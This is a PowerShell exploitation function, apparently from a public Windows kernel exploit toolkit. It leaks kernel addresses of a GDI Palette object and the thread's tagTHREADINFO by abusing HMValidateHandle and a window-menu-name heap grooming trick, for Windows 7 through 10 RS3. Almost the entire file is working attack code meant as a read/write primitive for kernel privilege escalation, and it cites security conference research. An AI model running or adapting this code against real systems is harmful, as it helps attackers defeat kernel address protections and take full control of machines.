function Stage-HmValidateHandlePalette {
<#
.SYNOPSIS
	Universal x64 Palette leak using HmValidateHandle. Includes tagTHREADINFO pointer to facilitate low integrity EPROCESS leak.
	Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2, 10 RS3

	Resources:
		+ Abusing GDI Objects for ring0 Primitives Revolution <= @Saif_Sherei (DefCon)
		  |--> https://sensepost.com/blog/2017/abusing-gdi-objects-for-ring0-primitives-revolution/

		+ Abusing GDI for ring0 exploit primitives: Evolution <= @NicoEconomou (ekoparty)
		  |--> https://labs.bluefrostsecurity.de/files/Abusing_GDI_for_ring0_exploit_primitives_Evolution_Slides.pdf

.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None

.EXAMPLE
	PS C:\Users\b33f> Stage-HmValidateHandlePalette
	
	tagTHREADINFO    : -6813887409648
	cEntries         : -6813890109412
	pFirstColor      : -6813890109320
	PaletteKernelObj : -6813890109440
	PaletteHandle    : 1007159191
	
	PS C:\Users\b33f> $Manager = Stage-HmValidateHandlePalette
	PS C:\Users\b33f> "{0:X}" -f $Manager.pFirstColor
	FFFFF9CD84802078
#>
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;

	[StructLayout(LayoutKind.Sequential)]
	public struct PALETTEENTRY
	{
		public Byte peRed;
		public Byte peGreen;
		public Byte peBlue;
		public Byte peFlags;
	}

	[StructLayout(LayoutKind.Sequential)]
	public struct LOGPALETTE
	{
		public UInt16 palVersion;
		public UInt16 palNumEntries;
		public PALETTEENTRY[] palPalEntry;
	}
	
	public class HmValidateHandlePalette
	{	
		delegate IntPtr WndProc(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
		struct WNDCLASS
		{
			public uint style;
			public IntPtr lpfnWndProc;
			public int cbClsExtra;
			public int cbWndExtra;
			public IntPtr hInstance;
			public IntPtr hIcon;
			public IntPtr hCursor;
			public IntPtr hbrBackground;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszMenuName;
			[MarshalAs(UnmanagedType.LPWStr)]
			public string lpszClassName;
		}

		[DllImport("user32.dll")]
		static extern System.UInt16 RegisterClassW(
			[In] ref WNDCLASS lpWndClass);
	
		[DllImport("user32.dll")]
		public static extern IntPtr CreateWindowExW(
			UInt32 dwExStyle,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpClassName,
			[MarshalAs(UnmanagedType.LPWStr)]
			string lpWindowName,
			UInt32 dwStyle,
			Int32 x,
			Int32 y,
			Int32 nWidth,
			Int32 nHeight,
			IntPtr hWndParent,
			IntPtr hMenu,
			IntPtr hInstance,
			IntPtr lpParam);
	
		[DllImport("user32.dll")]
		static extern System.IntPtr DefWindowProcW(
			IntPtr hWnd,
			uint msg,
			IntPtr wParam,
			IntPtr lParam);
	
		[DllImport("user32.dll")]
		public static extern bool DestroyWindow(
			IntPtr hWnd);
	
		[DllImport("user32.dll")]
		public static extern bool UnregisterClass(
			String lpClassName,
			IntPtr hInstance);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi)]
		public static extern IntPtr LoadLibrary(
			string lpFileName);
	
		[DllImport("kernel32",CharSet=CharSet.Ansi,ExactSpelling=true)]
		public static extern IntPtr GetProcAddress(
			IntPtr hModule,
			string procName);
	
		public delegate IntPtr HMValidateHandle(
			IntPtr hObject,
			int Type);
	
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreatePalette(
			ref LOGPALETTE logPal);
	
		public UInt16 CustomClass(string class_name, string menu_name)
		{
			m_wnd_proc_delegate = CustomWndProc;
			WNDCLASS wind_class = new WNDCLASS();
			wind_class.lpszClassName = class_name;
			wind_class.lpszMenuName = menu_name;
			wind_class.lpfnWndProc = System.Runtime.InteropServices.Marshal.GetFunctionPointerForDelegate(m_wnd_proc_delegate);
			return RegisterClassW(ref wind_class);
		}
	
		private static IntPtr CustomWndProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam)
		{
			return DefWindowProcW(hWnd, msg, wParam, lParam);
		}
	
		private WndProc m_wnd_proc_delegate;
	}
"@

	#------------------[Version details]
	$OSVersion = [Version](Get-WmiObject Win32_OperatingSystem).Version
	$OSMajorMinor = "$($OSVersion.Major).$($OSVersion.Minor)"

	#------------------[Create/Destroy Window]
	# Call nonstatic public method => delegWndProc
	$AtomCreate = New-Object HmValidateHandlePalette
	
	function Create-WindowObject {
		$MenuBuff = "A"*0x8F0
		$hAtom = $AtomCreate.CustomClass("BitmapStager",$MenuBuff)
		[HmValidateHandlePalette]::CreateWindowExW(0,"BitmapStager",[String]::Empty,0,0,0,0,0,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero,[IntPtr]::Zero)
	}
	
	function Destroy-WindowObject {
		param ($Handle)
		$CallResult = [HmValidateHandlePalette]::DestroyWindow($Handle)
		$CallResult = [HmValidateHandlePalette]::UnregisterClass("BitmapStager",[IntPtr]::Zero)
	}
	
	#------------------[Cast HMValidateHandle]
	function Cast-HMValidateHandle {
		$hUser32 = [HmValidateHandlePalette]::LoadLibrary("user32.dll")
		$lpIsMenu = [HmValidateHandlePalette]::GetProcAddress($hUser32, "IsMenu")
		
		# Get HMValidateHandle pointer
		for ($i=0;$i-lt50;$i++) {
			if ($([System.Runtime.InteropServices.Marshal]::ReadByte($lpIsMenu.ToInt64()+$i)) -eq 0xe8) {
				$HMValidateHandleOffset = [System.Runtime.InteropServices.Marshal]::ReadInt32($lpIsMenu.ToInt64()+$i+1)
				[IntPtr]$lpHMValidateHandle = $lpIsMenu.ToInt64() + $i + 5 + $HMValidateHandleOffset
			}
		}
	
		if ($lpHMValidateHandle) {
			# Cast IntPtr to delegate
			[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lpHMValidateHandle,[HmValidateHandlePalette+HMValidateHandle])
		}
	}
	
	#------------------[lpszMenuName Leak]
	function Leak-lpszMenuName {
		param($WindowHandle)
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 16299) {
			$pCLSOffset = 0xa8
			$lpszMenuNameOffset = 0x98
		} elseif ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 15063 -And $OSVersion.Build -lt 16299) {
			$pCLSOffset = 0xa8
			$lpszMenuNameOffset = 0x90
		}else {
			$pCLSOffset = 0x98
			$lpszMenuNameOffset = 0x88
		}
	
		# Cast HMValidateHandle & get window desktop heap pointer
		$HMValidateHandle = Cast-HMValidateHandle
		$lpUserDesktopHeapWindow = $HMValidateHandle.Invoke($WindowHandle,1)
	
		# Calculate ulClientDelta & leak lpszMenuName
		$ulClientDelta = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x20) - $lpUserDesktopHeapWindow.ToInt64()
		$KerneltagCLS = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+$pCLSOffset)
		
		# Create object to store _THRDESKHEAD.pti & lpszMenuName pointers
		$HashTable = @{
			tagTHREADINFO = [System.Runtime.InteropServices.Marshal]::ReadInt64($lpUserDesktopHeapWindow.ToInt64()+0x10)
			lpszMenuName = [System.Runtime.InteropServices.Marshal]::ReadInt64($KerneltagCLS-$ulClientDelta+$lpszMenuNameOffset)
		}
		New-Object PSObject -Property $HashTable
	}

	#------------------[Create Palette with size]
	function Create-Palette {
		param($Size)
		if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 14393) {
			$PalletteEntryOffset = 0x88
		} else {
			$PalletteEntryOffset = 0x90
		}
		
		$PaletteEntry = New-Object PALETTEENTRY
		$LogicalPalette = New-Object LOGPALETTE
		$LogicalPalette.palVersion = 0x300
		$LogicalPalette.palNumEntries = [math]::Round($(($Size-$PalletteEntryOffset)/4))
		$LogicalPalette.palPalEntry = @($PaletteEntry)
		
		[HmValidateHandlePalette]::CreatePalette([ref]$LogicalPalette)
	}
	
	#------------------[Palette Leak]
	$KernelArray = @()
	for ($i=0;$i -lt 20;$i++) {
		$TestWindowHandle = Create-WindowObject
		$KernelArray += Leak-lpszMenuName -WindowHandle $TestWindowHandle
		if ($KernelArray.Length -gt 1) {
			if ($KernelArray[$i].lpszMenuName -eq $KernelArray[$i-1].lpszMenuName) {
				Destroy-WindowObject -Handle $TestWindowHandle
				$PaletteHandle = Create-Palette -Size 0x1080
				break
			}
		}
		Destroy-WindowObject -Handle $TestWindowHandle
	}
	
	# pFirstColor offsets
	if ($OSMajorMinor -eq "10.0" -And $OSVersion.Build -ge 14393) {
		$pFirstColorOffset = 0x78
	} else {
		$pFirstColorOffset = 0x80
	}
	
	$HashTable = @{
		PaletteHandle = $PaletteHandle
		PaletteKernelObj = $($KernelArray[$i].lpszMenuName)
		cEntries = $($KernelArray[$i].lpszMenuName) + 0x1c
		pFirstColor = $($KernelArray[$i].lpszMenuName) + $pFirstColorOffset
		tagTHREADINFO = $($KernelArray[$i].tagTHREADINFO)
	}
	New-Object PSObject -Property $HashTable
}